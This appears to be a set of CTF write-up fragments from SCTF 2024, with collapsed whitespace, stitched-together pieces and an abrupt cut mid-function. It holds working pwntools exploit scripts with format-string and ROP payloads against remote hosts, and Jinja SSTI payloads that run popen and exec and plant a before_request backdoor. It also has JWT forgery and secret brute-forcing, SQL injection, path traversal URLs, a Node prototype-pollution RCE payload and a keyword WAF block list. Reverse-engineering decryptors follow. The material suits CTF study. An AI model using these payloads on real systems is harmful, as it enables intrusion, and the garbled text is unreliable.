free(b'cc')add(b'gg',0x60,b'g'*8)show(b'gg')
set_current_libc_base_and_log(recv_current_libc_addr(),0x1ecbe0)
gift(hex(libc.symbols['puts']).encode()+b'x00')

ia()

from pwn import *from LibcSearcher import *#io = process('./factory')elf = ELF('./factory')context(log_level='debug',arch=elf.arch,os=elf.os)io = remote('1.95.81.93',57777)libc = ELF('./libc.so.6')def debug(): gdb.attach(io) pause()def get_sys():
return libcbase + next(libc.search(b'/bin/shx00')), libcbase + libc.sym['system']r = lambda num : io.recv(num)ru = lambda data : io.recvuntil(data)rl = lambda : io.recvline()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sla = lambda data,pay : io.sendlineafter(data,pay)uu64 = lambda size : u64(io.recv(size).ljust(8,b'x00'))uu32 = lambda size : u32(io.recv(size).ljust(4,b'x00'))itr = lambda : io.interactive()li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')def fac(data): ru(b'= ') s(str(data))ru(b'How many factorys do you want to build: ')sl(str(40))for i in range(24): fac(i)ru(b'= ')#debug()s(str(elf.got['atol']-200))li(hex(elf.got['atol']))ru(b'= ')#debug()s(str(elf.plt['printf']))ru(b'= ')s("%14$p,%47$p")ru(b'0x')stack=int(r(12),16)+0x18li(hex(stack))ru(b'0x')libcbase=int(r(12),16)-147587li(hex(libcbase))one=libcbase+0xe3b01li(hex(one))ru(b'= ')pay = b'%' + str(one&0xffff).encode()+b'c%10$hn'pay=pay.ljust(0x10,b'x00')+p64(stack)#debug()s(pay)ru(b'= ')pay = b'%' + str(one>>16&0xffff).encode()+b'c%10$hn'pay=pay.ljust(0x10,b'x00')+p64(stack+2)s(pay)ru(b'= ')pay = b'%39c%10$hn'pay=pay.ljust(0x10,b'x00')+p64(stack-72)#debug()s(pay)itr()

./ugollvm-as hello.ll -o hello.bcllc hello.bc -o hello.sas -o hello.o hello.sgcc -no-pie -static hello.o -o hello

package main
func binsh() string{return "/bin/shx00"}func vuln() string{return "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}func main() {var num string = vuln() num="x10x80x49x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x27x7bx44x00x00x00x00x00x3bx00x00x00x00x00x00x00xc4x1bx40x00x00x00x00x00x77x77x77x77x77x77x77x77x88x88x88x88x88x88x88x88x11x11x11x11x11x11x11x22x22x22x22x22x22x22x22x33x33x33x33x33x33x33x33"return 0}

from tools import *context.log_level="debug"context.arch = "amd64"p,elf,libc=load("./vmcode","1.95.68.23:
58924")'''mb_push_addr_from_code x32stack[a1] = &stack[a1 - 1] x31magic_syscall x30-0x10 = rol_8_0x10 x2e-0x10 = and_8_0x10 x2f ror_8_0x10-rdix2dchange_pc x2cstack-8 = shl_8 x2bmov [stack-8],[stack-0x10] x2ashr_8_8 x29dec_rdi x28mov_rax_al_from_stack x27mov_4_imm_int_to_stack_int64_from_code x26exchange_stack_8_0x10 x25exchange_stack_8_stack_0x18 x24
xor_stack_0x10_stack_8 x23mov_esi_stack_rdi x22exchange_pc_code2bytes_to_stack8bytes x21 '''debug(p,"pie",0x12b8,0x0000000000001273)payload =b"x26"+b"x00"*4+b"x2fx28x26x66x6cx61x67"payload+=b"x31"+b"x26x00x00x00x00"+b"x25"payload+=b"x26x02x00x00x00"#x01x01x00x00x58x68x66x6Cx61x67x54x5Ex0Fx05x50x5Ex6Ax01x5Fx48x31xD2x68x00x01x00x00x59x6Ax28x58x0Fx05"payload+=b"x30"payload += b"x26x00x03x00x00"+b"x32"+b"x26x00x03x00x00"+b"x23"payload +=b"x26x03x00x00x00"+b"x26x00x00x00x00"+b"x30"payload += b"x32"+b"x26xb2x03x00x00"+b"x23"payload+=b"x26x00x05x00x00"+b"x31"+b"x24"+b"x26x01x00x00x00"+b"x26x01x00x00x00"+b"x30"#payload+=b"x28"*17+b"x26x00x03x00x00"+b"x24"*3+b"x26x03x00x00x00"payload=payload.ljust(0x50,b"x91")
sa("shellcode:",payload)p.interactive()

from flask import Flask, render_template, request, render_template_string,redirect
from verify import *from User import Userimport base64
from waf import waf
app = Flask(__name__,static_folder="static",template_folder="templates")user={}
@app.route('/register', methods=["POST","GET"])def register(): method=request.methodif method=="GET":
return render_template("register.html")if method=="POST":
data = request.get_json() name = data["username"] pwd = data["password"]if name != None and pwd != None:if data["username"] in user:
return "This name had been registered"else: user[name] = User(name, pwd)return "OK"
@app.route('/login', methods=["POST","GET"])def login(): method=request.methodif method=="GET":
return render_template("login.html")if method=="POST":
data = request.get_json() name = data["username"] pwd = data["password"]if name != None and pwd != None:if name not in user:
return "This account is not exist"else:if user[name].pwd == pwd: token=generateToken(user[name])return "OK",200,{"Set-Cookie":"Token="+token}else:
return "Wrong password"
@app.route('/admin', methods=["POST","GET"])def admin():
try: token = request.headers.get("Cookie")[6:] 
except:
return "Please login first"else: infor = json.loads(base64.b64decode(token)) name = infor["name"] token = infor["secret"] result = check(user[name], token)
 method=request.methodif method=="GET":
return render_template("admin.html",name=name)if method=="POST": template = request.form.get("code")if result != "True":
return result, 401 #just only blackListif waf(template):
return "Hacker Found" result=render_template_string(template) print(result)if result !=None:
return "OK"else:
return "error"
@app.route('/', methods=["GET"])def index():
return redirect("login")
@app.route('/removeUser', methods=["POST"])def remove():
try: token = request.headers.get("Cookie")[6:] 
except:
return "Please login first"else: infor = json.loads(base64.b64decode(token)) name = infor["name"] token = infor["secret"] result = check(user[name], token)if result != "True":
return result, 401
 rmuser=request.form.get("username") user.pop(rmuser)return "Successfully Removed:"+rmuser
if __name__ == '__main__': # for the safe del __builtins__.__dict__['eval'] app.run(debug=False, host='0.0.0.0', port=8080)

import time
class User():
def __init__(self,name,password):
self.name=nameself.pwd = passwordself.Registertime=str(time.time())[0:10]self.handle=None
self.secret=self.setSecret()
def handler(self):
self.handle = open("/dev/random", "rb")def setSecret(self): secret = self.Registertime
try:if self.handle == None:
self.handler() secret += str(self.handle.read(22).hex()) 
except Exception as e: print("this file is not exist or be removed")return secret

import jsonimport hashlibimport base64import jwt
from app import *from User import *def check(user,crypt): verify_c=crypt secret_key = user.secret
try: decrypt_infor = jwt.decode(verify_c, secret_key, algorithms=['HS256'])if decrypt_infor["is_admin"]=="1":
return "True"else:
return "You r not admin"
except:
return 'Don't be a Hacker!!!'
def generateToken(user): secret_key=user.secret secret={"name":
user.name,"is_admin":"0"}
 verify_c=jwt.encode(secret, secret_key, algorithm='HS256') infor={"name":
user.name,"secret":
verify_c} token=base64.b64encode(json.dumps(infor).encode()).decode()return token

evilcode=["\","{%","config","session","request","self","url_for","current_app","get_flashed_messages","lipsum","cycler","joiner","namespace","chr","request.","|","%c","eval","[","]","exec","pop(","get(","setdefault","getattr",":","os","app"]whiteList=[]def waf(s): s=str(s.encode())[2:-1].replace("\'","'").replace(" ","")if not s.isascii():
return Falseelse:
for key in evilcode:if key in s:
return Truereturn False

import time
class User():
def __init__(self,name,password):
self.name=nameself.pwd = passwordself.Registertime=str(time.time())[0:10]self.handle=None
self.secret=self.setSecret()
def handler(self):
self.handle = open("/dev/random", "rb")def setSecret(self): secret = self.Registertime
try:if self.handle == None:
self.handler() secret += str(self.handle.read(22).hex()) 
except Exception as e: print("this file is not exist or be removed")return secret

eyJuYW1lIjogImFkbWluIiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pWVdSdGFXNGlMQ0pwYzE5aFpHMXBiaUk2SWpBaWZRLlhLZmpXU1VkM2JYNEdXUjFCU1EwWUp0V0h5MVhwTzdnbEFNamlxdk1ucUUifQ==

{"name": "admin", "secret": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJpc19hZG1pbiI6IjAifQ.XKfjWSUd3bX4GWR1BSQ0YJtWHy1XpO7glAMjiqvMnqE"}

import time
from datetime import datetime, timezone
# 打印 Unix 时间戳的前10位print(str(time.time())[0:10])
# 将时间戳转换为 UTC 时间以验证
# utc_time = datetime.now(timezone.utc)
# print("当前 UTC 时间:", utc_time)

eyJuYW1lIjogIkpheTE3IiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pU21GNU1UY2lMQ0pwYzE5aFpHMXBiaUk2SWpBaWZRLjMtOWVoMWl1WkszM2libEN4V0lZR0FwZmNHUkVVWHBxaHQ4RkdLZ0c1N1UifQ==

{"name": "Jay17", "secret": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmF5MTciLCJpc19hZG1pbiI6IjAifQ.3-9eh1iuZK33iblCxWIYGApfcGREUXpqht8FGKgG57U"}

import jwt
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmF5MTciLCJpc19hZG1pbiI6IjAifQ.3-9eh1iuZK33iblCxWIYGApfcGREUXpqht8FGKgG57U" # 题目中的 token#password_file = "C:\Users\86159\PycharmProjects\pythonProject\WEB-xxx\JWT\jwtpassword.txt" # 密码字典文件password_file = "./jwtpassword.txt" # 枚举密码字典文件
with open(password_file,'rb') as file:
for line in file: line = line.strip() # 去除每行后面的换行
try: jwt.decode(token, verify=True, key=line, algorithms="HS256") # 设置编码方式为 HS256 print('key: ', line.decode('ascii'))break
except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): # 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的 print("key: ", line.decode('ascii'))break
except jwt.exceptions.InvalidSignatureError: # 签名错误则表示密钥不正确 print("Failed: ", line.decode('ascii'))continueelse: print("Not Found.")

eyJuYW1lIjogIkpheTE3IiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pU21GNU1UY2lMQ0pwYzE5aFpHMXBiaUk2SWpFaWZRLjBuVkp5NmpEaC0yRVRFWUtZWmcxNmFMTWxURTBDbFdzTWtxUzdfRmVEbjAifQ==

from flask import Flask, render_template, request, render_template_string,redirect

app = Flask(__name__,static_folder="static",template_folder="templates")

evilcode=["\","{%","config","session","request","self","url_for","current_app","get_flashed_messages","lipsum","cycler","joiner","namespace","chr","request.","|","%c","eval","[","]","exec","pop(","get(","setdefault","getattr",":","os","app"]whiteList=[]def waf(s): s=str(s.encode())[2:-1].replace("\'","'").replace(" ","")if not s.isascii():
return Falseelse:
for key in evilcode:if key in s:
return Truereturn False
@app.route('/', methods=["POST"])def index(): template = request.form.get("code")if waf(template):
return "Hacker Found"
 result=render_template_string(template)return result

if __name__ == '__main__':# for the safedel __builtins__.__dict__['eval'] app.run(debug=False, host='0.0.0.0', port=8080)

if __name__ == '__main__':# for the safedel __builtins__.__dict__['eval'] app.run(debug=False, host='0.0.0.0', port=8080)

{{x.__init__.__globals__.__builtins__.__import__('OS'.lower()).popen('echo f3n j1ng;').read()}}

code={{g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower())("print('123')")}}code={{g.pop.__globals__.__builtins__.__getitem__('ex''ec')("print('123')")}}

code={{g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower())("print('123')")}}

payload = "__import__("sys").modules.__getitem__("__main__").__dict__.__getitem__("APP".lower()).before_request_funcs.setdefault(None, []).append(lambda :
__import__('os').popen('/readflag').read())"encoded_payload = payload.encode('utf-8').hex()final_payload = f"bytes.fromhex('{encoded_payload}').decode('utf-8')"print(final_payload)

code={{g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower())("__import__('builtins').__dict__.__getitem__('EXEC'.lower())(bytes.fromhex('5f5f696d706f72745f5f282273797322292e6d6f64756c65732e5f5f6765746974656d5f5f28225f5f6d61696e5f5f22292e5f5f646963745f5f2e5f5f6765746974656d5f5f2822415050222e6c6f7765722829292e6265666f72655f726571756573745f66756e63732e73657464656661756c74284e6f6e652c205b5d292e617070656e64286c616d626461203a5f5f696d706f72745f5f28276f7327292e706f70656e28272f72656164666c616727292e72656164282929').decode('utf-8'))")}}

wafsql = function(str){console.log(str)return str}

admin'or 1=1
#

http://1.95.83.156:
30688/ExP0rtApi?v=static&f=//....//....//....//....//....//....//....//app/index.jshttp://1.95.83.156:
30688/ExP0rtApi?v=static&f=//....//....//....//....//....//....//....//app/handle/index.jshttp://1.95.83.156:
30688/ExP0rtApi?v=static&f=//....//....//....//....//....//....//....//app/handle/child_process.js

{"user":"__proto__","date":"2","reportmessage":{"env":{"NODE_OPTIONS":"-r /proc/self/environ","NODE_DEBUG":"require('child_process').execSync('touch /tmp/kaikaix');process.exit();//"},"shell":"/readflag"}}


```
<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <title>Title</title> </head> </html>
undefined4 FUN_80000690(void){byte bVar1;undefined uVar2;undefined4 uVar3;
int i;
i = FUN_8000125a(0x6000009c,0x60000004,0x60000000,DAT_80003990);if (i == 0){uVar3 = 0xffffffff;}else{aes_enc(0x60000004,&DAT_800039a3,&DAT_6000007c,0x20);for (i = 0; i < 0x20; i += 1){uVar2 = ROL1(CONCAT44(3,(uint)(byte)(&DAT_6000007c)[i]));(&DAT_6000007c)[i] = uVar2;bVar1 = DAT_6000007c;if (i < 31){bVar1 = *(byte *)(i + 0x6000007d);}(&DAT_6000007c)[i] = bVar1 ^ (&DAT_6000007c)[i];(&DAT_6000007c)[i] = (&DAT_6000007c)[i] ^ 0xff;}FUN_80001278(0x6000009c,&DAT_6000007c,0x60000000,DAT_80003990);uVar3 = 0;}return uVar3;}
from Crypto.Cipher import AES

ct = bytes([0x63, 0xD4, 0xDD, 0x72, 0xB0, 0x8C, 0xAE, 0x31, 0x8C, 0x33, 0x03, 0x22, 0x03, 0x1C, 0xE4, 0xD3,0xC3, 0xE3, 0x54, 0xB2, 0x1D, 0xEB, 0xEB, 0x9D, 0x45, 0xB1, 0xBE, 0x86, 0xCD, 0xE9, 0x93, 0xD8])

def ROL1(v0, v1):
return ((v0 << v1) | (v0 >> (8-v1))) & 0xFF

def ROR1(v0, v1):
return ((v0 >> v1) | (v0 << (8-v1))) & 0xFF
'''undefined4 FUN_80000690(void){byte bVar1;undefined uVar2;undefined4 uVar3;
int i;
i = FUN_8000125a(0x6000009c,0x60000004,0x60000000,DAT_80003990);if (i == 0){uVar3 = 0xffffffff;}else{aes_enc(0x60000004,&DAT_800039a3,&DAT_6000007c,0x20);for (i = 0; i < 0x20; i += 1){uVar2 = ROL1(CONCAT44(3,(uint)(byte)(&DAT_6000007c)[i]));(&DAT_6000007c)[i] = uVar2;bVar1 = DAT_6000007c;if (i < 31){bVar1 = *(byte *)(i + 0x6000007d);}(&DAT_6000007c)[i] = bVar1 ^ (&DAT_6000007c)[i];(&DAT_6000007c)[i] = (&DAT_6000007c)[i] ^ 0xff;}FUN_80001278(0x6000009c,&DAT_6000007c,0x60000000,DAT_80003990);uVar3 = 0;}return uVar3;}'''# enc
# flag = list(ct)
# for i in range(32):# flag[i] = ROL1(flag[i], 3)
# if i < 31:# v1 = flag[i+1]# else:# v1 = flag[0]# flag[i] ^= v1
# flag[i] ^= 0xFF
# decflag = list(ct)for i in reversed(range(32)):
flag[i] ^= 0xFFif i < 31:v1 = flag[i+1]else:v1 = flag[0]flag[i] ^= v1flag[i] = ROR1(flag[i], 3)
print(bytes(flag).hex())
# 0x800039A3aes = AES.new(bytes.fromhex('2E 35 7D 6A ED 44 F3 4D AD B9 11 34 13 EA 32 4E'), AES.MODE_ECB)tmp = aes.decrypt(bytes(flag))print(tmp)
# SCTF{Wlc_t0_the_wd_oF_IOT_s3cur}
.text:
000000000000BA2B mov edi, __NR_ptrace ; sysno.text:
000000000000BA30 call _syscall.text:
000000000000BA35 test rax, rax.text:
000000000000BA38 jz loc_BE2F
.text:
000000000000D6D2 lea rsi, a3aLua ; "3a.lua".text:
000000000000D6D9 mov rdi, r15.text:
000000000000D6DC xor edx, edx.text:
000000000000D6E2 call luaL_loadfilex ; 0x1492B
-- 3a.lualocal test = require('test')local data = string.dump(test)local fp = io.open("test_obf.luac","wb")fp:
write(data)fp:
close()
.op 0 gettabup.op 1 gettable.op 2 geti.op 3 getfield.op 4 settabup.op 5 settable.op 6 seti.op 7 setfield.op 8 newtable.op 9 self.op 10 addi.op 11 addk.op 12 subk.op 13 mulk.op 14 modk.op 15 powk.op 16 divk.op 17 idivk.op 18 bandk.op 19 bork.op 20 bxork.op 21 shri.op 22 shli.op 23 add.op 24 sub.op 25 mul.op 26 mod.op 27 pow.op 28 div.op 29 idiv.op 30 band.op 31 bor.op 32 bxor.op 33 shl.op 34 shr.op 35 mmbin.op 36 mmbini.op 37 mmbink.op 38 unm.op 39 bnot.op 40 not.op 41 len.op 42 concat.op 43 close.op 44 tbc.op 45 jmp.op 46 eq.op 47 lt.op 48 le.op 49 eqk.op 50 eqi.op 51 lti.op 52 lei.op 53 gti.op 54 gei.op 55 move.op 56 loadi.op 57 loadf.op 58 loadk.op 59 loadkx.op 60 loadfalse.op 61 lfalseskip.op 62 loadtrue.op 63 loadnil.op 64 getupval.op 65 setupval.op 66 test.op 67 testset.op 68 call.op 69 tailcall.op 70 return.op 71 return0.op 72 return1.op 73 forloop.op 74 forprep.op 75 tforprep.op 76 tforcall.op 77 tforloop.op 78 setlist.op 79 closure.op 80 vararg.op 81 varargprep.op 82 extraarg
b1 = instruction & 0xFFb2 = (instruction >> 8) & 0xFFb3 = (instruction >> 16) & 0xFFb4 = (instruction >> 24) & 0xFFopcode = b2 & 0x7Fif opcode == 127: opcode = 45 b4 = 0x7Felif opcode == 0 and b4 == 1 and last_opcode in [46, 47, 48, 49, 50, 51, 52, 53, 54, 66, 67]: opcode = 45 b4 = 0x80last_opcode = opcodeob4 = b4ob3 = b3ob2 = (b1 >> 1) | (b2 & 0x80)ob1 = ((b1 & 1) << 7) | (opcode)instruction2 = (ob4 << 24) | (ob3 << 16) | (ob2 << 8) | ob1
java -jar .unluac_2023_09_20.jar --opmap opmap.txt SGAME_3.luac
local pctbbgf = function(str) local padding = 8 - #str % 8 return str .. string.rep(" 00", padding)endlocal fvcrtxrrr = function(byte1, byte2, byte3, byte4)return (byte1 or 0) << 24 | (byte2 or 0) << 16 | (byte3 or 0) << 8 | (byte4 or 0)endlocal efvcrte = function(str)local result = {}
for i = 1, #str, 8 do table.insert(result, fvcrtxrrr(str:
byte(i, i + 3))) table.insert(result, fvcrtxrrr(str:
byte(i + 4, i + 7)))endreturn resultendlocal defcve = function(uint)return string.char(uint >> 24 & 255, uint >> 16 & 255, uint >> 8 & 255, uint & 255)endlocal abcde = function(rrrrrrrrrrray)do return enddo return endlocal resultdo return enddo return enddodo return endlocal (for state), (for state), (for state), (for state)dodo return endlocal _, uintdo return enddo return enddo return enddo return enddo return enddo return endreturnenddo return endreturnenddo return enddo return enddo return enddo return enddo return endreturn nil, nil, nil, nil, nil, nil, nil, nil, nil, nilendfunction cdefa(v, arrrrrrrrrr)local cccccccccccccccc, ccccccccccccccccc = v[1], v[2]local cccccccccc = 0local cccccc = 2576980377for _ = 1, 42 do cccccccccc = cccccccccc + cccccc & 4294967295 cccccccccccccccc = cccccccccccccccc + ((ccccccccccccccccc << 4 ~ ccccccccccccccccc >> 5) + ccccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc & 3) + 1]) & 4294967295 ccccccccccccccccc = ccccccccccccccccc + ((cccccccccccccccc << 4 ~ cccccccccccccccc >> 5) + cccccccccccccccc ~ cccccccccc + arrrrrrrrrr[(cccccccccc >> 11 & 3) + 1]) & 4294967295end cccccccccccccccc = cccccccccccccccc ~ 12 ccccccccccccccccc = ccccccccccccccccc ~ 18return {cccccccccccccccc, ccccccccccccccccc}endfunction bcdef(str, arrrrrrrrrr)local padded_str = pctbbgf(str)local uint32_rrrrrrrrrrray = efvcrte(padded_str)local encccderrrrrr = {}
for i = 1, #uint32_rrrrrrrrrrray, 2 dolocal block = { uint32_rrrrrrrrrrray[i], uint32_rrrrrrrrrrray[i + 1] }local enc_block = cdefa(block, arrrrrrrrrr) table.insert(encccderrrrrr, enc_block[1]) table.insert(encccderrrrrr, enc_block[2])endreturn abcde(encccderrrrrr)endlocal parcmo = function(rrrrrrrrrrray1, rrrrrrrrrrray2)if #rrrrrrrrrrray1 ~= #rrrrrrrrrrray2 thenreturn falseendfor i = 1, #rrrrrrrrrrray1 doif rrrrrrrrrrray1[i] ~= rrrrrrrrrrray2[i] thenreturn falseendendreturn trueendlocal ccccccc = input_flagif 44 ~= string.len(ccccccc) then print("please check your flag")endif 44 == string.len(ccccccc) thenlocal rrrrrrrrrrr = {3633266294,3301799896,2704688257,2306037448,1267864397,1132773035,114101720,3838684141,4189720444,4028672856,277437884,787003469 }local arrrrrrrrrr = {19088743,2309737967,4275878552,1985229328 }local encccderrrrrr = bcdef(ccccccc, arrrrrrrrrr)local rrrrrrrrrrrr = efvcrte(encccderrrrrr)if parcmo(rrrrrrrrrrrr, rrrrrrrrrrr) then print("yes yes you input the right flag")endif not parcmo(rrrrrrrrrrrr, rrrrrrrrrrr) then print("o this is wrong")endend
import hexdumpimport struct
DELTA = 2576980377ROUND = 42

def tea_dec(b, key):m = 0xFFFFFFFF_sum = (DELTA*ROUND) & 0xFFFFFFFFv0, v1 = struct.unpack_from('<2I', b)v0 = v0 ^ 12v1 = v1 ^ 18for i in range(ROUND):v1 -= (((((v0 << 4) & m) ^ (v0 >> 5)) + v0)^ (_sum + key[(_sum >> 11) & 3])) & mv1 &= mv0 -= (((((v1 << 4) & m) ^ (v1 >> 5)) + v1)^ (_sum + key[_sum & 3])) & mv0 &= m_sum -= DELTA_sum &= mreturn struct.pack('>2I', v0, v1)

enc_flag = [3633266294, 3301799896, 2704688257, 2306037448, 1267864397, 1132773035, 114101720, 3838684141, 4189720444, 4028672856, 277437884, 787003469]
if __name__ == '__main__':
key = [19088743,2309737967,4275878552,1985229328]_b = b''b = struct.pack('<12I', *enc_flag)for i in range(6):b1 = tea_dec(b[i*8:], key)_b += b1hexdump.hexdump(_b)print(_b)
# b'SCTF{470b-a3e5c-9beb-60337-84ef2-5194d-aedc}x00x00x00x00'
from Crypto.Cipher import AESenc_flag1 = bytearray.fromhex('F05B295FC35C2ABC8A428FE7635CFDAC747E6DD36713841BDA607C3696A880DA51A7ECE562FEC9B5E1F90712B353B3C0311486D0C3D092DE5A0DD1FF5B001D2E')for i in range(len(enc_flag1)): enc_flag1[i] ^= 0x66enc_flag = bytearray.fromhex('''59 AD 6B 76 42 6A EA 66 58 C1 E4 2B 32 BF EB 955E 26 13 18 FF 77 90 E3 4D FF 23 AF AF C7 E8 361F 11 3F 9E C3 B1 37 DC CC BF BD 1D B0 75 17 568E 89 E9 93 A8 78 1F DF D7 D9 15 5D 23 6E 4D DB''')
def xor66(b): res = [0]*len(b)for i in range(len(res)): res[i] = b[i] ^ 0x66return bytes(res)
iv = b'x00'a = AES.new(b'hey_syclover2024', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[:16])))a = AES.new(b'2024hey_syclover', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[16:32])))a = AES.new(b'over2024hey_sycl', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[32:48])))a = AES.new(b'syclover2024hey_', AES.MODE_ECB)print(xor66(a.decrypt(enc_flag[48:])))
# IHopeTheDebuggingProcessDidn1tTortureYouAndHopeYouHaveFunInSCTF!
0x5877E0 aes_ecb0x5877E0 new_aes(key)0x5877E0 魔改异或0x660x4B1723 call go_memcmp
sudo bpftrace -e 'watchpoint:
0x4B1723:8:x {printf("%s (%d): %p %sn", comm, pid, uptr(reg("bx")), str(uptr(0x5877E0)))}'
void __fastcall rc4_enc(int a1, char *a2){int v3; // r7int v4; // r4unsigned int i; // r6int v6; // r9
 rc4_set_key((char *)a1); LOBYTE(v3) = 0; v4 = 0;for ( i = 0; strlen(a2) > i; ++i ) { v4 = (v4 + 1) % 256; v3 = (unsigned __int8)(LOBYTE(rc4_box[v4]) + v3); v6 = rc4_box[v4]; rc4_box[v4] = rc4_box[v3]; rc4_box[v3] = v6; a2[i] ^= LOBYTE(rc4_box[(unsigned __int8)(LOBYTE(rc4_box[v4]) + LOBYTE(rc4_box[v3]))]); }}int __fastcall verify(int *a1, int *a2, int a3){int v4; // r4int i; // r4int j; // r4int v8[4]; // [sp+0h] [bp-34h] BYREFint v9[2]; // [sp+10h] [bp-24h]int v10[7]; // [sp+18h] [bp-1Ch] BYREF
 v4 = 0; v8[3] = 0xCDEF; v8[0] = 0x123; *(_QWORD *)&v8[1] = 0x89AB00004567LL;while ( v4 < a3 / 4 ) { v10[v4] = (LOBYTE(a1[v4]) << 24) | (BYTE1(a1[v4]) << 16) | (BYTE2(a1[v4]) << 8) | HIBYTE(a1[v4]); v4 = (unsigned __int16)(v4 + 1); }
for ( i = 0; i < a3 / 4; i = (unsigned __int16)(i + 1) ) v9[i] = (LOBYTE(a2[i]) << 24) | (BYTE1(a2[i]) << 16) | (BYTE2(a2[i]) << 8) | HIBYTE(a2[i]); tea_dec((unsigned int *)v10, v8);for ( j = 0; j < a3 / 4; j = (unsigned __int16)(j + 1) ) {if ( v10[j] != v9[j] )return 0; }return 1;}int __fastcall sub_80043E8(int a1, int a2, int a3, int a4){ ...case 6: v9 = 0x44332211; v10 = 0x88776655;if ( !verify(*(_DWORD *)(a3 + 4), (int)&v9, *(unsigned __int16 *)(a3 + 8)) )return 53; rc4_enc(*(_DWORD *)(a3 + 4), byte_200000A8);
int __fastcall sub_810004C(unsigned __int8 *ptr, _BYTE *outbuf, int a3){ _BYTE *endptr; // r4unsigned int v4; // r2unsigned int v5; // t1int v6; // r3int v7; // t1unsigned int v8; // r2unsigned int v9; // t1char v10; // t1
// seg000:
08004EA8 off_8004EA8 DCD dword_8004EC8 ; DATA XREF: sub_8000398↑o// seg000:
08004EA8 ; seg000:
off_80003B4↑o// seg000:
08004EAC DCD 0x20000000// seg000:
08004EB0 DCD 0x194// seg000:
08004EC8 dword_8004EC8 DCD 0x96021301 ; DATA XREF: sub_8000398+2↑o// seg000:
08004EC8 ; seg000:
off_80003B8↑o ...// seg000:
08004ECC DCD 0xB0120088// seg000:
08004ED0 DCD 0xFE91A614// seg000:
08004ED4 DCD 0xAF41D7B9// seg000:
08004ED8 DCD 0xE94ECC82// seg000:
08004EDC DCD 0x4F284747// seg000:
08004EE0 DCD 0x521042D1// seg000:
08004EE4 DCD 0xD0905801// seg000:
08004EE8 DCD 0xD0900003// seg000:
08004EEC DCD 0x1180203 endptr = &outbuf[a3];do { v5 = *ptr++; v4 = v5; v6 = v5 & 0xF;if ( (v5 & 0xF) == 0 ) { v7 = *ptr++; v6 = v7; } v8 = v4 >> 4;if ( !v8 ) { v9 = *ptr++; v8 = v9; }
while ( --v6 ) { v10 = *ptr++; *outbuf++ = v10; }
while ( --v8 ) *outbuf++ = 0; }
while ( outbuf < endptr );
return 0;}
import structfrom Crypto.Cipher import ARC4
key = [0x00000123, 0x00004567, 0x000089AB, 0x0000CDEF]
DELTA = 0x9E3779B9

def tea_enc(v0, v1, key):
_sum = 0for i in range(32):
_sum += 0x9E3779B9_sum &= 0xFFFFFFFFv0 += (key[0] + 16 * v1) ^ (v1 + _sum) ^ (key[1] + (v1 >> 5))v0 &= 0xFFFFFFFFv1 += (key[2] + 16 * v0) ^ (v0 + _sum) ^ (key[3] + (v0 >> 5))v1 &= 0xFFFFFFFFreturn v0, v1

b = struct.pack('<2I', 0x44332211, 0x88776655)v0, v1 = struct.unpack('>2I', b)
v0, v1 = tea_enc(v0, v1, key)b = struct.pack('>2I', v0, v1)
arc4 = ARC4.new(b)a = arc4.encrypt(bytes([0x14, 0xA6, 0x91, 0xFE, 0xB9, 0xD7, 0x41,0xAF, 0x82, 0xCC, 0x4E, 0xE9, 0x47, 0x47, 0x28, 0x4F, 0xD1]))print(a)
# W0L000043MB541337
Address Ordinal Name Library000000018000D110 PyNumber_Add python38000000018000D178 PyNumber_Subtract python38000000018000D1C0 PyNumber_And python38000000018000D1F8 PyNumber_Rshift python38000000018000D258 PyNumber_Index python38000000018000D2A8 PyNumber_Long python38000000018000D2C0 PyNumber_Lshift python38000000018000D328 PyNumber_TrueDivide python38000000018000D3B8 PyNumber_Xor python38
    #include <ctype.h>#include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>
int global_count = 0;
void hexdump(void *pdata, int size) {const uint8_t *p = (const uint8_t *)pdata;
int count = size / 16;
int rem = size % 16;
for (int r = 0; r <= count; r++) {int k = (r == count) ? rem : 16;if (r)printf("n");for (int i = 0; i < 16; i++) {if (i < k)printf("%02X ", p[i]);elseprintf(" "); }printf(" ");for (int i = 0; i < k; i++) {printf("%c", isprint(p[i]) ? p[i] : '.'); } p += 0x10; }printf("n");}#define ut32 unsigned int#define delta 0x9e3779b9void XXTea_Encrypt(ut32 *src, ut32 n, ut32 *key);
void XXTea_Decrypt(ut32 *enc, ut32 n, ut32 *key);// mxuint32_t round_enc(uint32_t v0, uint32_t v1, uint32_t v2, uint32_t *v3,uint32_t v4, uint32_t v5) {uint32_t res = 0;
